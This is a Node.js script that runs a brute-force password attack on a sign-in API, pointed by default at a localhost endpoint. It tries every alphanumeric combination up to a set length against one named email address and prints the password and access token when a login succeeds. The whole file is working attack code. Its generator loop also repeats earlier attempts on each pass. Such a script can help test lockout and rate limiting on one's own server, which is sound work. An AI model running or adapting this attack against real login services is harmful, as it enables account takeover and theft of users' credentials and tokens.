const axios = require('axios');
const baseURL = 'http://localhost:3001/v1/auth'; // Adjust this URL to match your server's configuration

// Define character set for password generation
const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function* generatePasswords(length, prefix = '') {
    if (length > 0) {
        for (let i = 0; i < charset.length; i++) {
            const next = prefix + charset[i];
            yield next;
            yield* generatePasswords(length - 1, next);
        }
    }
}

async function bruteForce(email, maxLength) {
    console.log(`Starting brute force attack for: ${email}`);

    for (let length = 1; length <= maxLength; length++) {
        let passwordGenerator = generatePasswords(length);
        for (let password of passwordGenerator) {
            // console.log(`Trying password: ${password} for email: ${email}`);
            try {
                const response = await axios.post(`${baseURL}/signin`, {
                    email,
                    password
                });

                if (response.data && response.data.content.meta.access_token) {
                    console.log(`Success! Email: ${email}, Password: ${password}`);
                    console.log(`Token: ${response.data.content.meta.access_token}`);
                    return; // Exit if a valid password is found
                }
            } catch (error) {
                if (error.response && error.response.data.message === 'Invalid credentials') {
                    console.log(`Failed attempt with password: ${password}`);
                } else {
                    // Handle other types of errors like network errors or server errors
                    console.log(`Error: ${error.message}`);
                }
            }
        }
    }
}

bruteForce('abc10@watchguard.com', 2); // Change the email and max length as needed
